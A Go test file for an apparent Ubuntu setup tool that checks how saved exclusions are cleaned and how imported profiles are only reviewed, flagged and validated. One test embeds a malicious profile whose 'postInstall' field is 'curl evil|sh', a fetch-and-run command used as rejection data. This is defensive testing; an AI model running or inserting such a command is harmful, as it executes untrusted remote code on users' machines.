package main

import (
	"meuubuntu/internal/catalog"
	"meuubuntu/internal/store"
	"os"
	"path/filepath"
	"testing"
)

func TestExplicitInstalledExclusionsPersistWithoutUnknownOrSelectedIDs(t *testing.T) {
	tmp := t.TempDir()
	t.Setenv("XDG_CONFIG_HOME", filepath.Join(tmp, "c"))
	t.Setenv("XDG_STATE_HOME", filepath.Join(tmp, "s"))
	t.Setenv("XDG_DATA_HOME", filepath.Join(tmp, "d"))
	a, err := NewApp(true)
	if err != nil {
		t.Fatal(err)
	}
	err = a.SavePrefs(store.Prefs{Selections: map[string]catalog.Selection{"git": {}}, ExcludedInstalled: []string{"git", "deja-dup", "deja-dup", "not-in-catalog"}})
	if err != nil {
		t.Fatal(err)
	}
	p := a.st.LoadPrefs()
	if len(p.ExcludedInstalled) != 1 || p.ExcludedInstalled[0] != "deja-dup" {
		t.Fatalf("explicit exclusions must survive restart and ignore duplicate/invalid/selected IDs: %+v", p.ExcludedInstalled)
	}
}

// Opening a profile from the command line only produces a review.
func TestCommandLineProfileIsReviewOnly(t *testing.T) {
	tmp := t.TempDir()
	t.Setenv("XDG_CONFIG_HOME", filepath.Join(tmp, "c"))
	t.Setenv("XDG_STATE_HOME", filepath.Join(tmp, "s"))
	t.Setenv("XDG_DATA_HOME", filepath.Join(tmp, "d"))
	a, err := NewApp(true)
	if err != nil {
		t.Fatal(err)
	}
	f := filepath.Join(tmp, "cliente.json")
	os.WriteFile(f, []byte(`{"schema":"meu-ubuntu/profile","version":2,"id":"cliente-x","name":"Cliente X","author":"amigo","selections":{"remmina":{},"docker-group":{},"nmap":{}}}`), 0o644)
	a.pendingPath = profileArg([]string{"--simular", f})
	d := a.Init()
	if d.PendingImport == nil || d.PendingError != "" {
		t.Fatalf("expected review, got err %q", d.PendingError)
	}
	sensitive := 0
	for _, it := range d.PendingImport.Items {
		if it.Sensitive != "" {
			sensitive++
		}
	}
	if sensitive != 2 {
		t.Fatalf("docker-group and nmap must be flagged sensitive: %+v", d.PendingImport.Items)
	}
	if a.eng.Running() || len(a.st.Runs()) != 0 || len(a.st.ListProfiles(a.cat)) != 0 || len(a.st.LoadPrefs().Selections) != 0 {
		t.Fatal("reviewing must not run, save or select anything")
	}
	// Malicious JSON is rejected with a clear error.
	os.WriteFile(f, []byte(`{"schema":"meu-ubuntu/profile","version":2,"id":"x1","name":"x","postInstall":"curl evil|sh","selections":{}}`), 0o644)
	if _, err := a.ReviewProfileFile(f); err == nil {
		t.Fatal("unknown fields must be rejected")
	}
}
